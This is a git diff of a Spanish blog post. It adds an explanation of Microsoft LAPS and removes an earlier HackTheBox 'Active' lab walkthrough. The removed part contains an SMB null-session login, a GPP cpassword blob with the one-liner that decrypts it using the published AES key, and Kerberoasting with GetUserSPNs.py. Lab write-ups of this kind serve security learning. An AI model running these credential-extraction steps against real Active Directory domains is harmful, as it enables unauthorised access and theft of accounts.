@@ -3,83 +3,20 @@ title: "LAPS Local Administrator Password Solution"
 layout: post
 ---
 
-
-
 <h2>LAPS Local Administrator Password Solution </h2>
 Uno de los problemas con lo que lidia toda seguridad en una infraestructura es el manejo de credenciales para los distintos dispositivos de la red, credenciales de acceso para servidores, para la administracion de router, firewall y switches, soluciones como servidores de autenticacion remotos o Single Sign On, ayudan a la solucion de esto, pero hoy quiero hablarle de la solucion de Microsoft para el re-uso de credenciales por partes de los administradores.
 
 Antes de LAPS una practica comun entre administradores era utilizar la misma contrasena en cada computadora, con el objetivo de poder acceder in caso de que algun evento lo impidiera. Esto trae como resultado que el comprometer una maquina cliente, se pudiera obtener el hash del RID 500 y loguearnos con el en cualquier computadora del dominio a traves de la cuenta local del administrador. 
 
-_<h6>Brute Forcing SID 500 in Active Directory [Mark Mo][Mark Mo]</h6>_
+_<h6> Brute Forcing SID 500 in Active Directory [Mark Mo][Mark Mo] </h6>_
 
-<h2>Reconocimiento</h2>
-En la fase de reconocimiento realizamos el siguiente network map, exportando el output en formato grep a un archivo llamado allports:
+<h2>¿Como funciona?</h2>
+
+Se instala un componente en cada computadora el cual genera cada cierto tiempo de manera _aleatoria_ contrasenas que sonn guardadas automaticamente en el Directorio Activo, adjuntadas como atributos de la computadora en cuestion y que solo el administrador puede ver el valor de este atributo.
+
+La configuracion de LAPS en el dominio trae consigo la cuestion de a quien se le deberia otorgar permisos para poder actualizar contrasenas y demas, como a usuarios fuera del grupo de _admins_ del dominio, como grupo de helpdesk, asunto que puede salirse de las manos con el tiempo y terminar otorgando permisos a usuarios. 
   
-{% highlight bash %}
-nmap -p- --min-rate 5000 10.10.10.100 -oG allports
-{% endhighlight %}
 
-**Output** Ports: 53/open/tcp//domain/, 88/open/tcp//kerberos-sec/, 135/open/tcp//msrpc, 139/open/tcp//netbios-ssn, 389/open/tcp//ldap/, 445/open/tcp//microsoft-ds/, 464/open/tcp//kpasswd5/, 593/open/tcp...
-
-<h2>Puertos y Servicios</h2>
-Con el fin de conocer un poco más de los servicios que se están ejecutando y lanzar una serie de script básico de reconocimiento para dichos puertos y servicios. 
-
-{% highlight bash %}
-nmap -p53,88,135,139,445,464,593,636,3268,3269,5722,9389 -sCV -A -oN allservices 10.10.10.100
-{% endhighlight %}
-
-![Ative HTB](/assets/images/services.png)
-
-<h2> SMB smbmap % smbclient </h2>
-A través de smbclient nos conectamos al directorio que tenemos acceso de lectura como nos indicó el comando, en este caso el directorio \Replication, luego de mapear dicho directorios con el comando smbmap que nos lista los permisos de los directorios, es decir si tenemos permisos de lectura y escritura:
-
-{% highlight bash %}
-smbmap -H 10.10.10.100
-{% endhighlight %}
-
-Con smbclient haciendo uso de un null session accedimos a listar dicho directorio y su contenido.
-{% highlight bash %}
-smbclient //10.10.10.100/Replicacion -U ""%""
-{% endhighlight %}
-
-
-
-Luego de navegar por el directorio policies en busca de algo interesante y observando cada archivo hasta dar con el archivo groups.xml, que según el siguiente article de [Hacking-Article][Hacking-Article] es creado como consecuencia de la configuración de Group Policy Preference, en la que permiten a un administrador crear policies e instalar aplicaciones a través de Group Policy. Y sobre la cual se guarda una contraseña encriptada en formato _cpassword_, y de la cual Microsoft publicó la llave, como podemos observar en el siguiente artículo, [Microsoft][Microsoft], trasladamos el contenido de dicha carpeta a nuestra carpeta content y efectivamente, como se puede observar, obtenemos las credenciales del usuario SVC_TGS:
-
-{% highlight bash %} <?xml version="1.0" encoding="utf-8"?>
-<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
-</Groups> {% endhighlight %}
-
-Desencriptamos la contraseña con el uso de la herramienta gpp-decrypt:
-
-
-también podemos hacer uso de el siguiente one-liner ya que conocemos la llave como mencionamos anteriormente:
-{% highlight bash %} echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000 {% endhighlight %}
-
-<h2>Validación de credenciales</h2>
-
-Utilizamos la herramienta crackmapexec.py del poderoso _impacket_ para verificar la autenticidad de dicho usuario en el dominio **active.htb**, las cuales resultaron ser válida aunque no obtuvimos un (Pwned!) e intentamos verificar si podiamos loguearnos a traves de winrm, pero no fue así. 
-
-
-
-**Nota** desde aqui podemos visualizar la flag del user, haciendo uso de smbclient y navegando entre directorios :)
-
-{% highlight bash %} smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingSt----8 {% endhighlight %}
-
-Pero teniendo un usuario y contraseña, se nos hace posible realizar un Kerberoasting attack, el cual TCM Security explica detallamente, que nos _dumpea_ los krbasrep5 hashes de las cuentas que tienen _Kerberos pre-authentication deshabilidata_ pero que explico con más detalle en el siguiente artículo, sobre mis apuntes. 
-Para esto utilizamos la herramienta _GetUserSPNs.py_, del poderoso impacket 🏅  
-
-{% highlight bash %} GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS {% endhighlight %}
-
-obtenemos el hash NTLMv2, enviamos a un archivo de texto y utilizamos John The Ripper, para obtener la credencial en texto plano.
-
-
-
-y ya obteniendo credenciales de administrador como nos muestra la primera línea del output del GetUserSPNs.py, y contraseña nos logueamos en el sistema. 
-
-
-Ya siendo Nt Authority\System, a buscar las flags.
-Que he decidido mostrar solo si existe algún paso más para llegar a ellas, no que tan solo sea navegar entre directorios como es este el caso, para poder verla. 
 
 
 [Mark Mo]: https://medium.com/@markmotig/brute-forcing-sid-500-in-active-directory-c9eb7c01a8a6
